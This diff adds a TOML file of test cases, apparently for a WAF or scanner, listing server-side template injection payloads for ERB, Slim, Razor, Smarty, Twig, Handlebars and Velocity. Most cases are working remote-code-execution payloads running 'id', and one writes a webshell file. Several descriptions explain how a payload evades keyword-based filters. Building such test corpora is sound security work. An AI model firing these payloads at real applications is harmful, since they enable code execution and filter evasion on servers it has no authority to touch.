@@ -1,0 +1,133 @@
+schema = 1
+# SSTI — Ruby (ERB / Slim), .NET (Razor), PHP (Smarty / Twig).
+# Each template engine has its own delimiter + capability surface;
+# WAFs that pattern-match `{{ }}` (Jinja2) and `${ }` (Java family)
+# miss every engine using a different syntax.
+
+# ── Ruby ERB ──
+
+[[case]]
+id = "erb_basic_echo"
+class = "ssti"
+payload = "<%= 7*7 %>"
+description = "ERB output tag — confirms ERB engine via 49 in response"
+
+[[case]]
+id = "erb_system_call"
+class = "ssti"
+payload = "<%= `id` %>"
+description = "ERB backtick — Ruby's command-substitution syntax; RCE"
+
+[[case]]
+id = "erb_system_method"
+class = "ssti"
+payload = "<%= system('id') %>"
+description = "ERB calling system() — alternative to backticks"
+
+[[case]]
+id = "erb_open_pipe"
+class = "ssti"
+payload = "<%= IO.popen('id').read %>"
+description = "ERB IO.popen — Ruby's popen for piped command output"
+
+[[case]]
+id = "erb_eval"
+class = "ssti"
+payload = "<%= eval('7*7') %>"
+description = "ERB eval — arbitrary Ruby code execution"
+
+# ── Ruby Slim (alternative templating) ──
+
+[[case]]
+id = "slim_inline_ruby"
+class = "ssti"
+payload = "= 7*7"
+description = "Slim inline Ruby expression — `=` prefix for output"
+
+[[case]]
+id = "slim_system_call"
+class = "ssti"
+payload = "= `id`"
+description = "Slim command-substitution"
+
+# ── .NET Razor ──
+
+[[case]]
+id = "razor_basic_echo"
+class = "ssti"
+payload = "@(7*7)"
+description = "Razor parens expression — basic detection"
+
+[[case]]
+id = "razor_object_dump"
+class = "ssti"
+payload = "@Context"
+description = "Razor accessing HttpContext — leaks request data"
+
+[[case]]
+id = "razor_system_diagnostics_process"
+class = "ssti"
+payload = "@(System.Diagnostics.Process.Start(\"cmd.exe\",\"/c id\"))"
+description = "Razor calling Process.Start — RCE on .NET"
+
+[[case]]
+id = "razor_appdomain_assemblies"
+class = "ssti"
+payload = "@AppDomain.CurrentDomain.GetAssemblies()"
+description = "Razor enumerating loaded assemblies — recon"
+
+# ── PHP Smarty ──
+
+[[case]]
+id = "smarty_basic_echo"
+class = "ssti"
+payload = "{7*7}"
+description = "Smarty bare-curly expression"
+
+[[case]]
+id = "smarty_php_block"
+class = "ssti"
+payload = "{php}echo system('id');{/php}"
+description = "Smarty {php} block — direct PHP code (older Smarty)"
+
+[[case]]
+id = "smarty_self_register"
+class = "ssti"
+payload = "{self::Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php phpinfo();?>\",self::clearConfig())}"
+description = "Smarty static-method abuse — write a webshell via  Smarty's internal write helper"
+
+[[case]]
+id = "smarty_function_call_phpinfo"
+class = "ssti"
+payload = "{function name=foo}{phpinfo()}{/function}{foo}"
+description = "Smarty function definition + call — bypasses some  Smarty-disabled-mode guards"
+
+# ── PHP Twig (more thorough than the existing file) ──
+
+[[case]]
+id = "twig_filter_map_id"
+class = "ssti"
+payload = "{{['id']|map('system')|join(',')}}"
+description = "Twig filter chain — map across the system filter calls  system('id'); often slips past `system` keyword rules"
+
+[[case]]
+id = "twig_filter_reduce_constructor"
+class = "ssti"
+payload = "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+description = "Twig sandbox escape via env.registerUndefinedFilterCallback  — historical CVE-2018-12648 surface"
+
+# ── Mustache / Handlebars (logic-less but with helpers) ──
+
+[[case]]
+id = "handlebars_constructor_prototype"
+class = "ssti"
+payload = "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"
+description = "Handlebars constructor-walking — Node.js RCE; long but  the canonical bypass for Handlebars sandbox"
+
+# ── Velocity (expanding the existing file with method-call variants) ──
+
+[[case]]
+id = "velocity_class_for_name_rce"
+class = "ssti"
+payload = "#set($x=$obj.class.forName('java.lang.Runtime').getMethod('exec',[Ljava/lang/String;).invoke($obj.class.forName('java.lang.Runtime').getMethod('getRuntime',[Ljava/lang/Object;).invoke(null,null),'id'))"
+description = "Velocity reflective Runtime.exec — full RCE without  Runtime keyword appearing in the payload"
